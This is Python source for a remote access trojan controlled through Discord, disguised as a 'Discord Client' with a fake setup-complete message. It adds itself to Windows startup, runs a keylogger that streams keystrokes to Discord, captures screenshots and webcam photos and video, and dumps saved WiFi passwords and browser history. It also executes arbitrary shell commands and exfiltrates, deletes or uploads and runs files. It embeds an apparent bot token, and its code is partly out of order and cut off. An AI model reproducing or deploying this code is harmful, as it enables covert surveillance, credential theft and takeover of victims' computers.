# ====================== AUTO STARTUP SETUP ======================
def add_to_startup():
    try:
        # Get the current exe path (works after nuitka --onefile)
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(sys.argv[0])

        key = reg.OpenKey(reg.HKEY_CURRENT_USER, 
                         r"Software\Microsoft\Windows\CurrentVersion\Run", 
                         0, reg.KEY_SET_VALUE)
        
        reg.SetValueEx(key, "MyDiscordClient", 0, reg.REG_SZ, exe_path)
        reg.CloseKey(key)
        
        print("[+] Successfully added to Windows Startup")
        return True
    except Exception as e:
        print(f"[-] Failed to add to startup: {e}")
        return False

# Show one-time message
def show_setup_message():
    try:
        ctypes.windll.user32.MessageBoxW(0, 
            "Discord Client has been installed successfully!\n\nIt will now run in background and auto-start on boot.", 
            "Setup Complete", 0x40 | 0x1000)
    except:
        pass

# ====================== LONG MESSAGE HELPER ======================
async def send_long_message(ctx, text: str, codeblock: bool = False):
    """Splits long messages automatically"""
    if len(text) <= 1900:
        if codeblock:
            await ctx.send(f"```\n{text}\n```")
        else:
            await ctx.send(text)
        return
    
    for i in range(0, len(text), 1900):
        chunk = text[i:i+1900]
        if codeblock:
            await ctx.send(f"```\n{chunk}\n```")
        else:
            await ctx.send(chunk)

import discord
from discord.ext import commands
import socket
import os
import time
import platform
import datetime
import aiohttp
import mss
import mss.tools
import psutil
from io import BytesIO
import winreg as reg
import subprocess
import cv2
import sys
import asyncio
import webbrowser
import shutil
import pyautogui
import threading
import pynput.keyboard as pynput_kb
import ctypes
import sqlite3
import random
import zipfile
import tempfile

TOKEN = "MTUwOTk3MDczNDc5MTc4NjY0MA.Gpk1Zr.wZUDuS5AIHNhmCL3J6bckLtfiQ0vFs2Hdfrubc"
GUILD_ID = 1509971694461124638

intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True
intents.voice_states = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

start_time = time.time()
pc_name = socket.gethostname()
try:
    windows_user = os.getlogin()
except:
    windows_user = "unknown"

current_dir = os.path.expanduser("~")

keylog_active = False
keylog_buffer = []
keylog_lock = threading.Lock()
keylog_listener = None
keylog_channel = None

mouse_follow_active = False
hydra_active = False
shake_active = False
fullscreen_lock_active = False
capslock_lock_active = False
audio_loop_active = False
audio_loop_path = None

bot_channel_id = None

def on_press(key):
    global keylog_buffer
    try:
        key_str = str(key).replace("'", "")
        if key_str.startswith("Key."):
            key_str = "[" + key_str[4:].upper() + "]"
        with keylog_lock:
            keylog_buffer.append(key_str)
        if keylog_channel:
            asyncio.run_coroutine_threadsafe(
                keylog_channel.send(f"Key: **{key_str}**"),
                bot.loop
            )
    except:
        pass

def start_keylogger_internal():
    global keylog_listener, keylog_active
    if keylog_listener is not None:
        return
    keylog_listener = pynput_kb.Listener(on_press=on_press)
    keylog_listener.start()
    keylog_active = True

def stop_keylogger_internal():
    global keylog_listener, keylog_active
    if keylog_listener is not None:
        keylog_listener.stop()
        keylog_listener = None
    keylog_active = False

def shake_loop():
    global shake_active
    while shake_active:
        try:
            x, y = pyautogui.position()
            pyautogui.moveTo(x + 20, y, duration=0.05)
            pyautogui.moveTo(x - 20, y, duration=0.05)
            pyautogui.moveTo(x, y, duration=0.05)
        except:
            break

def is_fullscreen():
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        if not hwnd:
            return False
        rect = ctypes.wintypes.RECT()
        ctypes.windll.user32.GetWindowRect(hwnd, ctypes.byref(rect))
        screen_w = ctypes.windll.user32.GetSystemMetrics(0)
        screen_h = ctypes.windll.user32.GetSystemMetrics(1)
        w = rect.right - rect.left
        h = rect.bottom - rect.top
        return w >= screen_w and h >= screen_h
    except:
        return False

def fullscreen_lock_loop():
    global fullscreen_lock_active
    while fullscreen_lock_active:
        try:
            if not is_fullscreen():
                pyautogui.press('f11')
            time.sleep(0.5)
        except:
            break

def get_capslock_state():
    try:
        hll_dll = ctypes.WinDLL("User32.dll")
        return hll_dll.GetKeyState(0x14) & 0x0001
    except:
        return None

def capslock_lock_loop():
    global capslock_lock_active
    while capslock_lock_active:
        try:
            state = get_capslock_state()
            if state == 0:
                pyautogui.press('capslock')
            time.sleep(0.1)
        except:
            break

async def check_channel(ctx):
    if bot_channel_id is None:
        return False
    return ctx.channel.id == bot_channel_id

@bot.event
async def on_ready():
    global bot_channel_id
    print(f"Logged in as {bot.user} (ID: {bot.user.id})")
    guild = bot.get_guild(GUILD_ID)
    if guild is None:
        print("Guild not found.")
        return
    # Name channel after windows username, append number if taken
    base_name = windows_user.lower().replace(" ", "-")[:28]
    existing = [c.name for c in guild.text_channels]
    counter = 1
    while f"{base_name}-{counter}" in existing:
        counter += 1
    channel_name = f"{base_name}-{counter}"
    channel = await guild.create_text_channel(channel_name)
    bot_channel_id = channel.id
    print(f"Created channel: {channel_name}")
    await channel.send(f"Bot online! PC: **{pc_name}** \u2022 User: **{windows_user}**")


    def update_buttons(self):
        self.prev_btn.disabled = self.page == 0
        self.next_btn.disabled = self.page == len(self.embeds) - 1

    @discord.ui.button(label="◀ Previous", style=discord.ButtonStyle.secondary)
    async def prev_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.page -= 1
        self.update_buttons()
        await interaction.response.edit_message(embed=self.embeds[self.page], view=self)

    @discord.ui.button(label="Next ▶", style=discord.ButtonStyle.secondary)
    async def next_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.page += 1
        self.update_buttons()
        await interaction.response.edit_message(embed=self.embeds[self.page], view=self)

    async def on_timeout(self):
        for item in self.children:
            item.disabled = True

@bot.command()
async def help(ctx):
    if not await check_channel(ctx):
        return

    embed = discord.Embed(
        title="🤖 Discord Client - All Commands",
        description="Here are all available commands:",
        color=0x00ff88
    )

    # System & Info
    embed.add_field(
        name="📊 System & Info",
        value=(
            "`!help` • `!whoami` • `!user`\n"
            "`!ping` • `!uptime` • `!info`\n"
            "`!sysinfo` • `!ip` • `!cpu`\n"
            "`!ram` • `!battery` • `!processes`\n"
            "`!screenshot` • `!webcampic` • `!camrec <sec>`\n"
            "`!installed` • `!clear <n>`"
        ),
        inline=False
    )

    # Files & Network
    embed.add_field(
        name="📁 Files & Network",
        value=(
            "`!wifi` • `!wifi-pass`\n"
            "`!disk` • `!drives` • `!netstat`\n"
            "`!files <path>` • `!folders` • `!ls`\n"
            "`!pwd` • `!cd <path>`\n"
            "`!sendfile` • `!delete` • `!mkdir`\n"
            "`!history` • `!downloads`"
        ),
        inline=False
    )

    # Execution & Control
    embed.add_field(
        name="⚙️ Execution & Control",
        value=(
            "`!upload` • `!run <cmd>` • `!kill`\n"
            "`!killall` • `!tasklist` • `!exes`\n"
            "`!startup` • `!addstartup`\n"
            "`!env` • `!pythonpath` • `!who`\n"
            "`!website` • `!lock` • `!shutdown`\n"
            "`!restart` • `!logoff`"
        ),
        inline=False
    )

    # Input & Audio
    embed.add_field(
        name="⌨️ Input & Audio",
        value=(
            "`!keylogger start/stop`\n"
            "`!write` • `!typefast` • `!press` • `!click`\n"
            "`!mousepos` • `!mousefollow` • `!shake`\n"
            "`!autoclick` • `!clipboard`\n"
            "`!volume` • `!audio` • `!audio-loop`\n"
            "`!mute` • `!messagebox` • `!hydra`"
        ),
        inline=False
    )

    # Misc
    embed.add_field(
        name="🎮 Misc & Fun",
        value=(
            "`!wallpaper` • `!capslock`\n"
            "`!fullscreen` • `!voice`"
        ),
        inline=False
    )

    embed.set_footer(text="Only works in your private channel")
    
    await ctx.send(embed=embed)

@bot.command()
async def whoami(ctx):
    if not await check_channel(ctx):
        return
    await ctx.send(f"PC Name: **{pc_name}**")

@bot.command()
async def user(ctx):
    if not await check_channel(ctx):
        return
    await ctx.send(f"Windows username: **{windows_user}**")

@bot.command()
async def ping(ctx):
    if not await check_channel(ctx):
        return
    latency = round(bot.latency * 1000)
    await ctx.send(f"Pong! `{latency}ms`")

@bot.command()
async def uptime(ctx):
    if not await check_channel(ctx):
        return
    uptime_sec = int(time.time() - start_time)
    uptime_str = str(datetime.timedelta(seconds=uptime_sec))
    await ctx.send(f"Bot uptime: **{uptime_str}**")

@bot.command()
async def info(ctx):
    if not await check_channel(ctx):
        return
    py_ver = platform.python_version()
    uptime_sec = int(time.time() - start_time)
    uptime_str = str(datetime.timedelta(seconds=uptime_sec))
    embed = discord.Embed(title="System Info", color=0x7289da)
    embed.add_field(name="PC Name", value=pc_name, inline=True)
    embed.add_field(name="User", value=windows_user, inline=True)
    embed.add_field(name="Python", value=py_ver, inline=True)
    embed.add_field(name="Uptime", value=uptime_str, inline=False)
    await ctx.send(embed=embed)

@bot.command()
async def sysinfo(ctx):
    if not await check_channel(ctx):
        return
    try:
        uname = platform.uname()
        boot_time = datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
        embed = discord.Embed(title="Detailed System Info", color=0x7289da)
        embed.add_field(name="OS", value=f"{uname.system} {uname.release}", inline=True)
        embed.add_field(name="Machine", value=uname.machine, inline=True)
        embed.add_field(name="Processor", value=uname.processor[:50] or "N/A", inline=False)
        embed.add_field(name="CPU Cores", value=str(psutil.cpu_count()), inline=True)
        embed.add_field(name="Boot Time", value=boot_time, inline=True)
        embed.add_field(name="PC Name", value=pc_name, inline=True)
        embed.add_field(name="User", value=windows_user, inline=True)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
async def ip(ctx):
    if not await check_channel(ctx):
        return
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://api.ipify.org?format=json") as resp:
                if resp.status == 200:
                    data = await resp.json()
                    await ctx.send(f"Public IP: **{data['ip']}**")
                else:
                    await ctx.send("Failed to fetch IP.")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
@commands.is_owner()
async def clear(ctx, amount: int = 10):
    if not await check_channel(ctx):
        return
    if amount < 1 or amount > 50:
        await ctx.send("Amount must be 1-50.")
        return
    deleted = await ctx.channel.purge(limit=amount + 1)
    await ctx.send(f"Deleted **{len(deleted)-1}** messages.", delete_after=5)

@bot.command()
async def screenshot(ctx):
    if not await check_channel(ctx):
        return
    try:
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            sct_img = sct.grab(monitor)
            png_bytes = mss.tools.to_png(sct_img.rgb, sct_img.size)
        file = discord.File(fp=BytesIO(png_bytes), filename="screen.png")
        await ctx.send(file=file)
    except Exception as e:
        await ctx.send(f"Failed: {str(e)}")

@bot.command()
async def cpu(ctx):
    if not await check_channel(ctx):
        return
    usage = psutil.cpu_percent(interval=1)
    await ctx.send(f"CPU usage: **{usage}%**")

@bot.command()
async def ram(ctx):
    if not await check_channel(ctx):
        return
    mem = psutil.virtual_memory()
    total = round(mem.total / (1024**3), 1)
    used = round(mem.used / (1024**3), 1)
    await ctx.send(f"RAM: **{used} GB** / **{total} GB** ({mem.percent}%)")

@bot.command()
async def battery(ctx):
    if not await check_channel(ctx):
        return
    try:
        bat = psutil.sensors_battery()
        if bat is None:
            await ctx.send("No battery detected.")
            return
        status = "Charging" if bat.power_plugged else "Discharging"
        await ctx.send(f"Battery: **{bat.percent:.1f}%** - {status}")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
async def processes(ctx):
    if not await check_channel(ctx):
        return
    try:
        procs = []
        for proc in sorted(psutil.process_iter(['name', 'cpu_percent']), 
                         key=lambda p: p.info['cpu_percent'] or 0, reverse=True)[:20]:
            procs.append(f"{proc.info['name']} ({proc.info['cpu_percent'] or 0:.1f}%)")
        
        msg = "Top 20 Processes by CPU:\n" + "\n".join(procs)
        await ctx.send(msg)
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
async def webcampic(ctx):
    if not await check_channel(ctx):
        return
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            await ctx.send("Webcam not found.")
            return
        ret, frame = cap.read()
        cap.release()
        if not ret:
            await ctx.send("Failed to capture frame.")
            return
        _, buffer = cv2.imencode('.png', frame)
        file = discord.File(fp=BytesIO(buffer.tobytes()), filename="webcam.png")
        await ctx.send(file=file)
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
@commands.is_owner()
async def camrec(ctx, seconds: int = 10):
    if not await check_channel(ctx):
        return
    if seconds < 5 or seconds > 300:
        await ctx.send("Use 5-300 seconds.")
        return
    await ctx.send(f"Recording webcam for {seconds}s...")
    out_path = os.path.join(os.path.expanduser("~"), f"camrec_{int(time.time())}.avi")
    cap = None
    out = None
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            await ctx.send("Webcam not found.")
            return
        width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
        height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
        out = cv2.VideoWriter(out_path, cv2.VideoWriter_fourcc(*'XVID'), 20.0, (width, height))
        end_time = time.time() + seconds
        while time.time() < end_time:
            ret, frame = cap.read()
            if ret:
                out.write(frame)
    except Exception as e:
        await ctx.send(f"Error during recording: {str(e)}")
        return
    finally:
        if cap is not None:
            cap.release()
        if out is not None:
            out.release()
    try:
        if not os.path.exists(out_path) or os.path.getsize(out_path) == 0:
            await ctx.send("Recording failed - file empty or missing.")
            return
        await ctx.send(file=discord.File(out_path, filename="webcam_recording.avi"))
    except Exception as e:
        await ctx.send(f"Error sending file: {str(e)}")
    finally:
        try:
            if os.path.exists(out_path):
                os.remove(out_path)
        except:
            pass

@bot.command()
async def installed(ctx):
    if not await check_channel(ctx):
        return
    try:
        await ctx.send("Fetching installed programs... (this may take a few seconds)")
        
        output = subprocess.check_output(['wmic', 'product', 'get', 'name'], 
                                       stderr=subprocess.STDOUT, text=True)
        
        lines = [line.strip() for line in output.splitlines() 
                if line.strip() and not line.startswith("Name")]
        
        if not lines:
            await ctx.send("No installed programs found.")
            return

        msg = f"Installed Programs ({len(lines)} total):\n" + "\n".join(lines)
        
        # Use helper to split into multiple messages if too long
        await send_long_message(ctx, msg)
        
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
async def wifi(ctx):
    if not await check_channel(ctx):
        return
    try:
        output = subprocess.check_output(['netsh', 'wlan', 'show', 'interfaces'], text=True)
        for line in output.splitlines():
            if "SSID" in line and "BSSID" not in line:
                ssid = line.split(":", 1)[1].strip()
                await ctx.send(f"Current WiFi: **{ssid}**")
                return
        await ctx.send("Not connected to WiFi.")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command(name="wifi-pass")
@commands.is_owner()
async def wifi_pass(ctx, *, ssid: str = None):
    if not await check_channel(ctx):
        return
    try:
        if ssid:
            cmd = "netsh wlan show profile name=\"" + ssid + "\" key=clear"
            output = subprocess.check_output(cmd, shell=True, text=True, stderr=subprocess.STDOUT, encoding="utf-8", errors="ignore")
            password = "(no password / open network)"
            for line in output.splitlines():
                if "Key Content" in line:
                    password = line.split(":", 1)[1].strip()
                    break
            await ctx.send("WiFi: **" + ssid + "**\nPassword: **" + password + "**")
        else:
            profiles_out = subprocess.check_output("netsh wlan show profiles", shell=True, text=True, stderr=subprocess.STDOUT, encoding="utf-8", errors="ignore")
            profiles = []
            for line in profiles_out.splitlines():
                if "All User Profile" in line:
                    parts = line.split(":", 1)
                    if len(parts) == 2:
                        name = parts[1].strip()
                        if name:
                            profiles.append(name)
            if not profiles:
                await ctx.send("No saved WiFi profiles found.")
                return
            results = []
            for profile in profiles:
                try:
                    cmd = "netsh wlan show profile name=\"" + profile + "\" key=clear"
                    out = subprocess.check_output(cmd, shell=True, text=True, stderr=subprocess.STDOUT, encoding="utf-8", errors="ignore")
                    password = "(no password)"
                    for line in out.splitlines():
                        if "Key Content" in line:
                            password = line.split(":", 1)[1].strip()
                            break
                    results.append(profile + ": " + password)
                except:
                    results.append(profile + ": (error)")
            msg = "**Saved WiFi Passwords:**\n" + "\n".join(results)
            chunks = [msg[i:i+1900] for i in range(0, len(msg), 1900)]
            for chunk in chunks:
                await ctx.send(chunk)
    except Exception as e:
        await ctx.send("Error: " + str(e))

@bot.command()
async def disk(ctx):
    if not await check_channel(ctx):
        return
    msg = "Disk usage:\n"
    for part in psutil.disk_partitions(all=False):
        try:
            if 'cdrom' in part.opts or part.fstype == '':
                continue
            usage = psutil.disk_usage(part.mountpoint)
            total = round(usage.total / (1024**3), 1)
            used = round(usage.used / (1024**3), 1)
            msg += f"{part.device}: {used} GB / {total} GB ({usage.percent}%)\n"
        except:
            pass
    await ctx.send(msg or "No disks found.")

@bot.command()
async def drives(ctx):
    if not await check_channel(ctx):
        return
    msg = "Drives:\n"
    for part in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(part.mountpoint)
            total = round(usage.total / (1024**3), 1)
            msg += f"{part.device} - {part.fstype} - {total} GB\n"
        except:
            msg += f"{part.device} - inaccessible\n"
    await ctx.send(msg or "No drives found.")

@bot.command()
@commands.is_owner()
async def netstat(ctx):
    if not await check_channel(ctx):
        return
    try:
        output = subprocess.check_output("netstat -an", shell=True, text=True)
        await ctx.send(f"```\n{output[:1900]}\n```")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
@commands.is_owner()
async def files(ctx, *, path: str = "."):
    if not await check_channel(ctx):
        return
    try:
        entries = os.listdir(path)
        
        if not entries:
            await ctx.send(f"No files or folders found in `{path}`.")
            return

        msg = f"Contents of `{path}`:\n"
        for e in entries:
            full = os.path.join(path, e)
            kind = "D" if os.path.isdir(full) else "F"
            msg += f"[{kind}] {e}\n"

        # Use the helper to split long messages
        await send_long_message(ctx, msg, codeblock=False)
        
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
@commands.is_owner()
async def folders(ctx, *, path: str = "."):
    if not await check_channel(ctx):
        return
    try:
        entries = [e for e in os.listdir(path) if os.path.isdir(os.path.join(path, e))]
        if not entries:
            await ctx.send("No folders found.")
            return
        
        msg = f"Folders in `{path}` ({len(entries)} total):\n" + "\n".join(entries)
        await send_long_message(ctx, msg)
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
@commands.is_owner()
async def ls(ctx):
    if not await check_channel(ctx):
        return
    try:
        entries = os.listdir(current_dir)
        if not entries:
            await ctx.send("No files or folders found.")
            return

        msg = f"Contents of `{current_dir}` ({len(entries)} items):\n"
        for e in entries:
            full = os.path.join(current_dir, e)
            kind = "D" if os.path.isdir(full) else "F"
            msg += f"[{kind}] {e}\n"

        await send_long_message(ctx, msg)
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
@commands.is_owner()
async def pwd(ctx):
    if not await check_channel(ctx):
        return
    await ctx.send(f"Current directory: `{current_dir}`")

@bot.command()
@commands.is_owner()
async def cd(ctx, *, path: str):
    if not await check_channel(ctx):
        return
    global current_dir
    try:
        new_dir = os.path.abspath(os.path.join(current_dir, path))
        if os.path.isdir(new_dir):
            current_dir = new_dir
            await ctx.send(f"Changed to: `{current_dir}`")
        else:
            await ctx.send("Directory not found.")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
@commands.is_owner()
async def sendfile(ctx, *, path: str):
    if not await check_channel(ctx):
        return
    try:
        if not os.path.isfile(path):
            await ctx.send("File not found.")
            return
        await ctx.send(file=discord.File(path))
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
@commands.is_owner()
async def delete(ctx, *, path: str):
    if not await check_channel(ctx):
        return
    try:
        if os.path.isfile(path):
            os.remove(path)
            await ctx.send(f"Deleted file: `{path}`")
        elif os.path.isdir(path):
            shutil.rmtree(path)
            await ctx.send(f"Deleted folder: `{path}`")
        else:
            await ctx.send("Path not found.")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
@commands.is_owner()
async def mkdir(ctx, *, name: str):
    if not await check_channel(ctx):
        return
    try:
        path = os.path.join(current_dir, name)
        os.makedirs(path, exist_ok=True)
        await ctx.send(f"Created folder: `{path}`")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
@commands.is_owner()
async def history(ctx):
    if not await check_channel(ctx):
        return
    await ctx.send("Grabbing history from all browsers...")
    browser_dbs = {
        "Chrome": os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\History"),
        "Edge": os.path.expanduser(r"~\AppData\Local\Microsoft\Edge\User Data\Default\History"),
        "Brave": os.path.expanduser(r"~\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"),
        "Opera": os.path.expanduser(r"~\AppData\Roaming\Opera Software\Opera Stable\History"),
        "OperaGX": os.path.expanduser(r"~\AppData\Roaming\Opera Software\Opera GX Stable\History"),
        "Vivaldi": os.path.expanduser(r"~\AppData\Local\Vivaldi\User Data\Default\History"),
        "Firefox": None,
    }
    all_rows = []
    temp_files = []
    txt_path = os.path.join(tempfile.gettempdir(), "browser_history.txt")
    zip_path = os.path.join(tempfile.gettempdir(), "browser_history.zip")
    try:
        for browser, db_path in browser_dbs.items():
            if browser == "Firefox":
                ff_base = os.path.expanduser(r"~\AppData\Roaming\Mozilla\Firefox\Profiles")
                if os.path.exists(ff_base):
                    for profile in os.listdir(ff_base):
                        places = os.path.join(ff_base, profile, "places.sqlite")
                        if os.path.exists(places):
                            tmp = os.path.join(tempfile.gettempdir(), f"ff_hist_{profile}.db")
                            try:
                                shutil.copy2(places, tmp)
                                temp_files.append(tmp)
                                conn = sqlite3.connect(tmp)
                                cursor = conn.cursor()
                                cursor.execute("SELECT url, title, last_visit_date FROM moz_places WHERE last_visit_date IS NOT NULL ORDER BY last_visit_date ASC")
                                for url, title, ts in cursor.fetchall():
                                    if ts:
                                        ts_dt = datetime.datetime(1970, 1, 1) + datetime.timedelta(microseconds=ts)
                                        all_rows.append((ts_dt, browser, title or "", url or ""))
                                conn.close()
                            except:
                                pass
            else:
                if not db_path or not os.path.exists(db_path):
                    continue
                tmp = os.path.join(tempfile.gettempdir(), f"hist_{browser}.db")
                try:
                    shutil.copy2(db_path, tmp)
                    temp_files.append(tmp)
                    conn = sqlite3.connect(tmp)
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title, last_visit_time FROM urls WHERE last_visit_time IS NOT NULL ORDER BY last_visit_time ASC")
                    for url, title, ts in cursor.fetchall():
                        if ts:
                            ts_dt = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=ts)
                            all_rows.append((ts_dt, browser, title or "", url or ""))
                    conn.close()
                except:
                    pass
        if not all_rows:
            await ctx.send("No browser history found.")
            return
        all_rows.sort(key=lambda x: x[0])
        with open(txt_path, "w", encoding="utf-8") as f:
            f.write(f"Browser History - Total {len(all_rows)} entries (Oldest to Newest)\n")
            f.write("=" * 80 + "\n\n")
            for ts_dt, browser, title, url in all_rows:
                ts_str = ts_dt.strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"[{ts_str}] [{browser}]\n")
                f.write(f"  Title: {title[:100]}\n")
                f.write(f"  URL:   {url[:200]}\n\n")
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.write(txt_path, "browser_history.txt")
        await ctx.send(
            f"Found **{len(all_rows)}** history entries from all browsers (sorted oldest to newest).",
            file=discord.File(zip_path, filename="browser_history.zip")
        )
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")
    finally:
        for tmp in temp_files:
            try:
                if os.path.exists(tmp):
                    os.remove(tmp)
            except:
                pass
        try:
            if os.path.exists(txt_path):
                os.remove(txt_path)
        except:
            pass
        try:
            if os.path.exists(zip_path):
                os.remove(zip_path)
        except:
            pass

@bot.command()
@commands.is_owner()
async def downloads(ctx, count: int = 8):
    if not await check_channel(ctx):
        return
    dl_path = os.path.expanduser(r"~\Downloads")
    if not os.path.exists(dl_path):
        await ctx.send("Downloads folder not found.")
        return
    files_list = sorted(
        [f for f in os.listdir(dl_path) if os.path.isfile(os.path.join(dl_path, f))],
        key=lambda x: os.path.getmtime(os.path.join(dl_path, x)),
        reverse=True
    )[:count]
    if not files_list:
        await ctx.send("No files in Downloads.")
        return
    msg = "Recent downloads:\n"
    for f in files_list:
        full = os.path.join(dl_path, f)
        size_mb = os.path.getsize(full) / (1024 * 1024)
        mtime = datetime.datetime.fromtimestamp(os.path.getmtime(full)).strftime("%Y-%m-%d %H:%M")
        msg += f"- {mtime} | {size_mb:.1f} MB | {f}\n"
    await ctx.send(msg[:1900])

@bot.command()
@commands.is_owner()
async def upload(ctx, *, save_dir: str = None):
    if not await check_channel(ctx):
        return
    dest_folder = save_dir if save_dir and os.path.isdir(save_dir) else os.path.expanduser("~")
    await ctx.send("Send any file now. Saving to `" + dest_folder + "`. Waiting 60s...")
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel and m.attachments
    try:
        msg = await bot.wait_for("message", check=check, timeout=60.0)
        attach = msg.attachments[0]
        save_path = os.path.join(dest_folder, attach.filename)
        await attach.save(save_path)
        ext = attach.filename.lower().rsplit('.', 1)[-1] if '.' in attach.filename else ''
        runnable = ext in ('py', 'bat', 'cmd', 'ps1', 'exe', 'vbs', 'js')
        if runnable:
            await ctx.send("Saved to **" + save_path + "**\nRun it? Type yes or no (10s)")
            def check_run(m):
                return m.author == ctx.author and m.channel == ctx.channel and m.content.lower() in ['yes', 'no']
            try:
                run_msg = await bot.wait_for("message", check=check_run, timeout=10.0)
                if run_msg.content.lower() == 'yes':
                    try:
                        if ext == 'py':
                            subprocess.Popen([sys.executable, save_path], creationflags=subprocess.CREATE_NO_WINDOW)
                        elif ext in ('bat', 'cmd'):
                            subprocess.Popen(save_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                        elif ext == 'ps1':
                            subprocess.Popen(['powershell', '-ExecutionPolicy', 'Bypass', '-File', save_path], creationflags=subprocess.CREATE_NO_WINDOW)
                        elif ext == 'exe':
                            subprocess.Popen([save_path], creationflags=subprocess.CREATE_NO_WINDOW)
                        elif ext in ('vbs', 'js'):
                            subprocess.Popen(['wscript', save_path], creationflags=subprocess.CREATE_NO_WINDOW)
                        await ctx.send("Running **" + attach.filename + "**")
                    except Exception as e:
                        await ctx.send(f"Run error: {str(e)}")
                else:
                    await ctx.send("Not executed.")
            except asyncio.TimeoutError:
                await ctx.send("No response, not executed.")
        else:
            await ctx.send("Saved to **" + save_path + "**")
    except asyncio.TimeoutError:
        await ctx.send("Timed out.")
    except Exception as e:
        await ctx.send(f"Upload failed: {str(e)}")

@bot.command()
@commands.is_owner()
async def run(ctx, *, cmd: str):
    if not await check_channel(ctx):
        return
    try:
        output = subprocess.check_output(cmd, shell=True, text=True, stderr=subprocess.STDOUT, timeout=15)
        await ctx.send(f"```\n{output[:1900]}\n```")
    except subprocess.TimeoutExpired:
        await ctx.send("Command timed out.")
    except subprocess.CalledProcessError as e:
        await ctx.send(f"```\n{e.output[:1900]}\n```")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
@commands.is_owner()
async def kill(ctx, *, target: str):
    if not await check_channel(ctx):
        return
    killed = []
    try:
        pid = int(target)
        proc = psutil.Process(pid)
        proc.terminate()
        killed.append(f"PID {pid}")
    except ValueError:
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] and target.lower() in proc.info['name'].lower():
                try:
                    proc.terminate()
                    killed.append(f"{proc.info['name']} ({proc.info['pid']})")
                except:
                    pass
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")
        return
    await ctx.send(f"Killed: {', '.join(killed)}" if killed else "No matching process found.")

@bot.command()
@commands.is_owner()
async def killall(ctx):
    if not await check_channel(ctx):
        return
    await ctx.send("Terminating all user apps...")
    skip = ['system', 'svchost.exe', 'explorer.exe', 'python.exe', 'pythonw.exe', 'discord.exe']
    killed = []
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] and proc.info['name'].lower() not in skip:
            try:
                proc.terminate()
                killed.append(proc.info['name'])
            except:
                pass
    await ctx.send(f"Terminated {len(killed)} processes.")

@bot.command()
@commands.is_owner()
async def tasklist(ctx):
    if not await check_channel(ctx):
        return
    try:
        output = subprocess.check_output("tasklist", shell=True, text=True)
        await ctx.send(f"```\n{output[:1900]}\n```")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
@commands.is_owner()
async def exes(ctx):
    if not await check_channel(ctx):
        return
    try:
        exes = []
        for proc in psutil.process_iter(['name', 'pid']):
            if proc.info['name'] and proc.info['name'].lower().endswith('.exe'):
                exes.append(f"{proc.info['name']} ({proc.info['pid']})")
        
        if not exes:
            await ctx.send("No .exe processes found.")
            return

        msg = "Running .exe files:\n" + "\n".join(exes)
        await send_long_message(ctx, msg, codeblock=True)
        
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")
@bot.command()
@commands.is_owner()
async def startup(ctx):
    if not await check_channel(ctx):
        return
    try:
        await ctx.send("Fetching startup programs...")
        
        output = subprocess.check_output("wmic startup get caption,command", 
                                       shell=True, text=True)
        
        lines = [line.strip() for line in output.splitlines() 
                if line.strip() and "Caption" not in line and line.strip()]
        
        if not lines:
            await ctx.send("No startup items found.")
            return

        msg = f"Startup Programs ({len(lines)} total):\n" + "\n".join(lines)
        
        # Use helper to split long output
        await send_long_message(ctx, msg, codeblock=True)
        
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
@commands.is_owner()
async def addstartup(ctx, *, path: str):
    if not await check_channel(ctx):
        return
    try:
        if not path.lower().endswith('.py'):
            await ctx.send("Only .py files supported.")
            return
        startup_folder = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
        filename = os.path.basename(path)
        dest = os.path.join(startup_folder, filename)
        shutil.copy2(path, dest)
        await ctx.send(f"Added **{filename}** to startup.")
    except FileNotFoundError:
        await ctx.send("File not found.")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
